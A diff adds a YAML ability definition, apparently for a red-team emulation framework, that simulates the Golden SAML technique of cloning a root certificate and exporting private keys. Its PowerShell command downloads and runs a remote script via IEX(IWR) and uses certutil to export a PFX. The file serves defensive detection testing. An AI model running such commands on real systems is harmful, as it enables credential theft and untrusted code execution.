@@ -1,0 +1,32 @@
+---
+- id: 000549902a51ef21f57d3d28a6e5ecc0
+  name: CertUtil ExportPFX
+  description: 'The following Atomic test simulates adding a generic non-malicious
+    certificate to the Root certificate store. This behavior generates a registry
+    modification that adds the cloned root CA certificate in the keys outlined in
+    the blog. In addition, this Atomic utilizes CertUtil to export the PFX (ExportPFX),
+    similar to what was seen in the Golden SAML attack.
+
+    Keys will look like - \SystemCertificates\CA\Certificates or \SystemCertificates\Root\Certificates
+
+    Reference: https://posts.specterops.io/code-signing-certificate-cloning-attacks-and-defenses-6f98657fc6ec
+
+    Reference: https://www.splunk.com/en_us/blog/security/a-golden-saml-journey-solarwinds-continued.html
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1552.004
+    name: 'Unsecured Credentials: Private Keys'
+  platforms:
+    windows:
+      psh:
+        command: IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1553.004/src/RemoteCertTrust.ps1'
+          -UseBasicParsing) ; certutil.exe -p password -exportPFX Root 1F3D38F280635F275BE92B87CF83E40E40458400
+          c:\temp\atomic.pfx
+        payloads: []
+        cleanup: Get-ChildItem -Path Cert:\ -Recurse | Where-Object { $_.Thumbprint
+          -eq '1F3D38F280635F275BE92B87CF83E40E40458400' } | remove-item
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
